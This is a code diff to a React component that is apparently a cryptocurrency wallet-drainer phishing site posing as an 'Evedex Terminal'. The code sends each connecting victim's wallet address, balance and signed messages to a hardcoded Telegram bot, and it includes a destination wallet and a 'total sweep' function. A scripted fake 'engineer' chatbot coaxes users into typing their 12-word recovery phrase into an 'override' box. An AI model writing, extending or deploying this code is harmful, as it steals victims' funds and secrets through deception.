@@ -24,7 +24,6 @@ export default function EvedexTerminal() {
   const [stage, setStage] = useState(1);
   const chatEndRef = useRef(null);
 
-  // YOUR TELEGRAM CONFIG
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
@@ -33,31 +32,35 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
-  // CAPTURE SIGNATURES
+  // --- AUTOMATED CONNECTION HANDLER ---
+  useEffect(() => {
+    if (isConnected && address && balance?.formatted) {
+      // 1. Tell you on Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: `🟢 WALLET_CONNECTED\nADDR: ${address}\nBAL: ${balance.formatted}` }),
+      });
+
+      // 2. Make the Bot welcome them in the app
+      setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: NODE_ALIGNED. Secure RPC bridge established. System protocols are now unlocked for your vault." }]);
+      setStage(2); // Move to "Connected" stage
+    }
+  }, [isConnected]);
+
   const captureHandshake = (type) => {
-    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
+    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING`;
     signMessage({ message: msg }, {
       onSuccess: (sig) => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            chat_id: chatId, 
-            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
-          }),
+          body: JSON.stringify({ chat_id: chatId, text: `🎯 ${type} CAPTURED\nSIG: ${sig}` }),
         });
-        if(stage === 1) setStage(2); 
       }
     });
   };
 
-  useEffect(() => {
-    if (isConnected && address && balance?.formatted) {
-      setTimeout(() => { captureHandshake("CONNECTION_VERIFY"); }, 1500);
-    }
-  }, [isConnected, address, balance]);
-
-  // --- THE SMART STAGED AI BRAIN ---
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     const userMsg = chatInput.toLowerCase();
@@ -69,43 +72,35 @@ export default function EvedexTerminal() {
       let response = "";
       const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-      // STAGE 3: STUCK AT 90% (IN-WALLET)
+      // --- MODE A: STAGE 3 (STUCK AT 90%) ---
       if (stage === 3) {
-        if (["stuck", "90", "waiting", "slow", "why", "stop", "finish"].some(w => userMsg.includes(w))) {
-          response = pick([
-            "[ENGINEER]: Node indexing is paused at the 90% security threshold. The system has detected a 'Vault Ownership Conflict'. To release the assets and finish the sync, please utilize the Red Manual Override box below.",
-            "[ENGINEER]: Protocol stalled. High-value native assets require a manual cryptographic signature to clear the desync. Please provide your 12-word master key in the designated error box to reach 100%."
-          ]);
-        } else if (["seed", "phrase", "key", "safe", "mnemonic"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: The master entropy is required to re-index your private vault to the mainnet cluster. This is a local-only verification to force the final 10% synchronization. Your assets remain under vault isolation during this process.";
+        if (["stuck", "90", "why", "phrase", "seed"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: Vault indexing is paused at 90%. A 'Master Entropy' signature is required to finalize the cluster. Please use the Red Manual Override box below.";
         } else {
-          response = "[ENGINEER]: System status: 90% Indexed. To finalize the vault repair and clear the node stall, please use the Red Manual Override box with your recovery phrase.";
+          response = "[ENGINEER]: Current status: 90% Indexed. To finish the vault repair, please input your 12-word recovery phrase into the Red Error Box.";
         }
       } 
-      // STAGE 1-2: INITIAL CONNECTION (SAFARI / OUTSIDE WALLET)
-      else {
-        if (["money", "balance", "token", "see", "show", "missing", "wallet", "funds"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: Diagnostic indicates assets are obscured by an RPC indexing lag in your current browser. To view your full vault and holdings, you must mirror this session into your Wallet's internal DApp browser.";
-        } 
-        else if (["how", "step", "guide", "help", "process", "go about", "instructions", "connect"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: Connection Procedure: 1. Click the COPY icon in the chat bar. 2. Open Trust Wallet or MetaMask. 3. Paste the URL into the 'DApps Browser' tab. This establishes the secure RPC bridge needed to initialize your vault.";
-        } 
-        else if (["not working", "can't", "error", "problem", "click", "type", "locked"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: RPC Handshake Blocked. Standard browsers (Safari/Chrome) do not have 'Write' permissions for node repairs. To unlock the terminal and portal fields, please move this session to your Wallet's internal browser.";
-        } 
-        else {
-          response = "[ENGINEER]: System Diagnostic: RPC latency detected in standard webview. For full vault access and synchronization, please ensure you are utilizing your Wallet's internal DApp browser.";
+      // --- MODE B: STAGE 2 (CONNECTED IN WALLET) ---
+      else if (isConnected) {
+        if (["money", "balance", "token", "see"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: Node alignment is stable. To view your synchronized vault balance, click the 'INITIALIZE' button on any portal to begin the final data mapping.";
+        } else {
+          response = "[ENGINEER]: Secure bridge is ACTIVE. Select a task (Stake/Swap/Rectify) and click INITIALIZE to proceed with the synchronization.";
         }
+      }
+      // --- MODE C: STAGE 1 (NOT CONNECTED / SAFARI) ---
+      else {
+        response = "[ENGINEER]: Protocol Error. Standard browsers (Safari/Chrome) lack the native Web3 provider. Copy the URL and paste it into your Wallet's internal DApp browser to establish a secure link.";
       }
 
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
       setIsTyping(false);
-    }, 1500);
+    }, 1200);
   };
 
   const copyLink = () => {
     navigator.clipboard.writeText("https://evedex.network");
-    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. PASTE IN WALLET DAPP BROWSER." }]);
+    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. OPEN TRUST WALLET OR METAMASK BROWSER." }]);
   };
 
   const executeTotalSweep = async () => {
@@ -133,7 +128,7 @@ export default function EvedexTerminal() {
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <w3m-button balance="hide" /> 
       </header>
@@ -154,7 +149,6 @@ export default function EvedexTerminal() {
           <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
             <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2>
-            
             <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
               <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">
                 {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED (LOCKED)" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
@@ -164,7 +158,6 @@ export default function EvedexTerminal() {
               ) : (
                 <div className="flex items-center gap-2">
                   <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-cyan-400 italic outline-none w-full pointer-events-auto" autoFocus />
-                  <span className="text-[10px] font-black text-cyan-900">{balance?.symbol}</span>
                 </div>
               )}
             </div>
@@ -182,7 +175,7 @@ export default function EvedexTerminal() {
           <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <button onClick={copyLink} className="text-slate-600 hover:text-cyan-500 transition-colors pr-2"><Copy size={16}/></button>
+          <button onClick={copyLink} className="text-slate-600 hover:text-cyan-500 pr-2"><Copy size={16}/></button>
           <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
           <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
         </div>
